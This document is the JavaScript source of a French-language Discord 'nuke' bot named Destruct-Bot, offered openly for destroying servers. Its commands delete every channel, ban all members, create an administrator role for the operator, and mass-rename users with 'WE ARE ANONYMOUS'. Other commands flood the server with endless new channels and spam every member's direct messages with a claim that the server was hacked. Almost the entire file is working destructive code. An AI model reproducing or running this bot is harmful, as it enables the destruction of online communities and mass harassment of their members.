const Discord = require('discord.js');
const client = new Discord.Client()
const settings = require('./config')

const prefix = settings.Prefix;
const login = settings.Token_Bot;
const OwnerID = settings.OwnerID;
const CommandsNumber = 11

client.login(login)

client.on('ready', function(){
    console.log(`--------------------------------------`)
    console.log(`--> Template by JockeRider199`)
    console.log(`--> Connecté avec succès`)
    console.log(`--> Bot Name : [ ${client.user.tag} ]`)
    console.log(`--> Nombre de Commandes :   [ ${CommandsNumber} ]`)
    console.log(`--> Préfix actuel :         [ ${prefix} ]`)
    console.log(`--> Nombre d'utilisateurs : [ ${client.users.size} ]`)
    console.log(`--> Nombre de Salons :      [ ${client.channels.size} ]`)
    console.log(`--> Nombre de Serveurs :    [ ${client.guilds.size} ]`)
    console.log(`--> Bot ID :                [ ${client.user.id} ]`)
    console.log("--------------------------------------" + "\n" +"=> Prêt" + "\n" + "______________________________________" + "\n")
    client.user.setActivity("Activation = " + "[ "+ prefix + "help ]")
    client.user.setStatus("online")
})

client.on('message', message => {
    if(message.channel.type === "dm") return;
    if(message.content === prefix + "help"){
        message.delete()
        let embed = new Discord.RichEmbed()
        .setColor("#000000")
        .setThumbnail("https://cdn.discordapp.com/attachments/520964094245732353/520983966652825610/58430e1ea6515b1e0ad75b56.png")
        .setTitle("Voici mon menu d'aide :")
        .setDescription("**Merci d'utiliser Destruct-Bot, si vous voulez partagez le bot à vos amis, n'hésitez pas !** \n\nCommandes : \n\n`-> setgame` : Modifie le \"Joue à...\" par la suite de votre message. \n`-> delete-guild` : Supprime tous les salons du serveur et crée un salon juste visible par vous (et les personnes administratrices). \n\n`-> ban-everyone` : je pense que c'est clair :) \n`-> gmod` : vous met admin \n`-> rename-guild` : renomme le serveur par la suite de votre message\n\n`-> icon` : change l'icon du serveur.\n`-> spam-mp` : spamme tous les utilisateurs en mp\n`-> rename-everyone` : renomme tout le monde\n`->  channels` : crée plein de salon\n`-> clean` : nettoie tout votre bordel :)")
        .setFooter(`N'oubliez pas : il faut votre prefix devant chaque commande ! Votre préfix est : ${prefix}`)
        
        let embed2 = new Discord.RichEmbed()
        .setColor("#000000")
        .setDescription("Il est conseillé d'essayer votre bot sur un serveur de test. **Nous ne sommes pas responsables de ce que vous allez faire ! Que se soit clair!** \n Vous remarquez des bugs ? Allez nous le signaler sur notre github.\n\n Une fois le serveur détruit faites la commande `leave` pour que le bot quitte le serveur.")
        .setFooter("L'équipe de Destruct Discord")
        message.author.send(embed)
        message.author.send(embed2)
    }
    if(message.content.startsWith(prefix + "setgame")){
        if(message.author.id !== OwnerID) return;
        message.delete()
        let args = message.content.split(" ").slice(1).join(" ")
        client.user.setActivity(args)
    }  
    if(message.content === prefix + "delete-guild"){
        if(message.author.id !== OwnerID) return;
        message.guild.channels.forEach(channel => {
            channel.delete()
        })
        setTimeout(function(){
            message.guild.createChannel("operator", "text", [{
                id : message.guild.id,
                deny : ['READ_MESSAGES']
            }])
            setTimeout(function(){
            let channel = message.guild.channels.find('name', "operator")
            channel.overwritePermissions(message.author, {
                ADMINISTRATOR : true
            })
            }, 500)
        }, 1500)
    }
    if(message.content === prefix + "ban-everyone"){
        if(message.author.id !== OwnerID) return;
        message.delete()
        message.guild.members.forEach(user => {
            user.ban("Destruct Discord Bot")
            .catch()
        })
    }
    if(message.content === prefix + "gmod"){
        if(message.author.id !== OwnerID) return;
        message.delete()
        message.guild.createRole({
            name : "Destruct Discord Bot",
            permissions : "ADMINISTRATOR"
        })
        setTimeout(function(){
            let role = message.guild.roles.find("name", "Destruct Discord Bot")
            message.member.addRole(role.id)
        }, 1000)
    }
    if(message.content.startsWith(prefix + "rename-guild")){
        if(message.author.id !== OwnerID) return;
        message.delete()
        let args = message.content.split(" ").slice(1).join(" ")
        message.guild.setName(args)
    }
    if(message.content === prefix + "icon"){
        if(message.author.id !== OwnerID) return;
        message.delete()
        setTimeout(boucle, 1)

        function boucle(){
        message.guild.setIcon('./image.png')
        setInterval(function(){
            message.guild.setIcon('./AnonOps.png')
            setTimeout(boucle, 2000)
        }, 2000)
        
        }
    }
    if(message.content === prefix + "spam-mp"){
        if(message.author.id !== OwnerID) return;
        message.delete()
        message.guild.members.forEach(user => {
            let embed = new Discord.RichEmbed()
            .setColor("#000000")
            .setDescription(`**Le serveur ${message.guild.name} est bien hacké par l'équipe Destruct Discord !**`)
            .setImage("https://cdn.discordapp.com/attachments/520964094245732353/520983966652825610/58430e1ea6515b1e0ad75b56.png")
            .setFooter("Ce bot est en open source sur github")
            user.send(embed)
            user.send(embed)
            user.send(embed)
            user.send(embed)
            .catch()
        })
    }
    if(message.content === prefix + "rename-everyone"){
        if(message.author.id !== OwnerID ) return;
        message.delete()
        message.guild.members.forEach(user => {
            user.setNickname("WE ARE ANONYMOUS")
            .catch()
        })
    }
    if(message.content === prefix + "channels"){
        if(message.author.id !== OwnerID) return;
        message.delete()
        setTimeout(boucle2, 1)

        function boucle2(){
            message.guild.createChannel("we are anonymous")
            message.guild.createChannel("we are anonymous", "voice")
            setTimeout(boucle2, 500)
        }
    }
    if(message.content === prefix + "clean"){
        if(message.author.id !== OwnerID) return;
        message.guild.channels.forEach(channel => {
            channel.delete()
        })
        message.guild.setName("Nothing Happen")
        message.guild.setIcon()
        message.guild.createChannel("nothing happen")
    }
    if(message.content === prefix + "leave"){
        message.guild.leave()
        console.log("SERVEUR QUITTE AVEC SUCCES")
    }
})
